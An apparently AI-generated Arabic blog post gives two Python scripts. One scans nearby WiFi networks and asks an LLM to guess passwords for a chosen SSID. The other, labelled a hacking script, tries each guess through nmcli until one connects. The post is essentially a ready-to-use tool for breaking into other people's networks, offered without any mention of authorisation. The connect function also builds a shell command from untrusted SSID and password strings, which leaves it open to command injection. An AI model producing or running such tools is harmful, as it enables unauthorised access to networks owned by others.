---
audio: false
generated: true
image: false
lang: ar
layout: post
model: x-ai/grok-4-fast
title: نص توليد كلمة مرور الواي فاي
translated: true
type: note
---

```python
#!/usr/bin/env python3
"""
نص توليد كلمات مرور WiFi
يقوم بمسح شبكات WiFi، ويسمح للمستخدم باختيار واحدة، ويولد كلمات مرور مقترحة باستخدام LLM، ويحفظ في مجلد @tmp.
هذا النص يتطلب اتصالاً بالإنترنت لاستخدام LLM. استخدم نصاً منفصلاً بلا اتصال لمحاولة الاتصال بكلمات المرور المحفوظة.
"""

import os
import sys
from get_wifi_list import get_wifi_list
from openrouter_client import call_openrouter_api

# التأكد من وجود مجلد @tmp
TMP_DIR = '@tmp'
os.makedirs(TMP_DIR, exist_ok=True)

def parse_wifi_list(wifi_output):
    """
    تحليل المخرجات من get_wifi_list لاستخراج SSIDs والتفاصيل.
    يُرجع قائمة من القواميس تحتوي على 'index', 'ssid', 'full_line'.
    """
    networks = []
    lines = wifi_output.split('\n')
    current_ssid = None
    for i, line in enumerate(lines):
        if line.startswith('SSID: '):
            # استخراج SSID من السطر
            ssid_part = line.split('SSID: ')[1].split(',')[0].strip()
            current_ssid = ssid_part
            networks.append({
                'index': len(networks) + 1,
                'ssid': current_ssid,
                'full_line': line
            })
        elif current_ssid and line.strip().startswith('  '):
            # إلحاق معلومات إضافية بشبكة آخر إذا كان سطراً فرعياً
            networks[-1]['full_line'] += '\n' + line
    return networks

def generate_password_suggestions(ssid, num_suggestions=10, model="deepseek-v3.2"):
    """
    استخدام OpenRouter LLM لتوليد كلمات مرور مقترحة لـ SSID المحدد.
    """
    prompt = f"Suggest {num_suggestions} possible passwords for a WiFi network named '{ssid}'. Make them plausible based on common patterns, the name, or defaults. List them numbered, one per line, no explanations."
    try:
        response = call_openrouter_api(prompt, model=model)
        # تنظيف الاستجابة لاستخراج القائمة فقط
        lines = [line.strip() for line in response.split('\n') if line.strip() and line[0].isdigit()]
        passwords = [line.split('.', 1)[1].strip() if '.' in line else line for line in lines[:num_suggestions]]
        return passwords
    except Exception as e:
        print(f"Error generating passwords: {e}")
        return []

def save_passwords_to_file(ssid, passwords):
    """
    حفظ قائمة كلمات المرور في ملف داخل مجلد @tmp.
    """
    filename = os.path.join(TMP_DIR, f"{ssid.replace(' ', '_')}_passwords.txt")
    with open(filename, 'w') as f:
        for pwd in passwords:
            f.write(f"{pwd}\n")
    print(f"Passwords saved to: {filename}")
    return filename

def main():
    print("=== مُولِّد كلمات مرور WiFi ===")
    print()

    # الحصول على قائمة WiFi
    print("جاري المسح للعثور على شبكات WiFi المتاحة...")
    wifi_output = get_wifi_list()
    print("شبكات WiFi المتاحة:")
    if wifi_output.startswith("No WiFi"):
        print(f"  {wifi_output}")
        sys.exit(1)

    # تحليل وعرض القائمة المرقمة
    networks = parse_wifi_list(wifi_output)
    if not networks:
        print("لم يتم العثور على شبكات.")
        sys.exit(1)

    for net in networks:
        print(f"{net['index']}. {net['full_line']}")

    # إدخال المستخدم
    try:
        choice = int(input(f"\nاختر شبكة (1-{len(networks)}): "))
        if 1 <= choice <= len(networks):
            selected = networks[choice - 1]
            ssid = selected['ssid']
            print(f"\nالمحدد: {ssid}")
        else:
            print("اختيار غير صالح.")
            sys.exit(1)
    except ValueError:
        print("إدخال غير صالح.")
        sys.exit(1)

    # توليد كلمات المرور
    print(f"\nجاري توليد {10} اقتراح لكلمة مرور لـ '{ssid}'...")
    passwords = generate_password_suggestions(ssid)

    if passwords:
        print("كلمات المرور المقترحة:")
        for i, pwd in enumerate(passwords, 1):
            print(f"{i}. {pwd}")
        # الحفظ في ملف
        save_passwords_to_file(ssid, passwords)
    else:
        print("فشل في توليد كلمات المرور.")

    print("\nاستخدم نصاً منفصلاً بلا اتصال لقراءة هذا الملف ومحاولة الاتصال.")

if __name__ == "__main__":
    main()
```

بالنسبة للنص الإختراقي بلا اتصال (مثال: `offline_hack_wifi.py`)، يمكنك إنشاؤه بشكل منفصل لقراءة كلمات المرور من `@tmp/{ssid}_passwords.txt` ومحاولة الاتصال باستخدام أدوات مثل `nmcli` أو `wpa_supplicant`. إليك هيكل أساسي:

```python
#!/usr/bin/env python3
"""
نص اختراق WiFi بلا اتصال
يقرأ كلمات المرور المحفوظة ويحاول الاتصال بـ WiFi المحدد بلا اتصال.
"""

import os
import subprocess
import sys

TMP_DIR = '@tmp'

def attempt_connect(ssid, password):
    """
    محاولة الاتصال بـ WiFi باستخدام nmcli (أو بديل).
    """
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Success with password: {password}")
            return True
        else:
            print(f"Failed with password: {password}")
            return False
    except Exception as e:
        print(f"Error attempting connect: {e}")
        return False

def main():
    ssid_file = input("Enter the SSID or full filename in @tmp (e.g., MyWiFi_passwords.txt): ").strip()
    filepath = os.path.join(TMP_DIR, ssid_file)
    
    if not os.path.exists(filepath):
        print("File not found.")
        sys.exit(1)
    
    ssid = ssid_file.replace('_passwords.txt', '').replace('_', ' ')
    print(f"Attempting to connect to '{ssid}'...")
    
    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    for pwd in passwords:
        if attempt_connect(ssid, pwd):
            break
    else:
        print("All passwords failed.")

if __name__ == "__main__":
    main()
```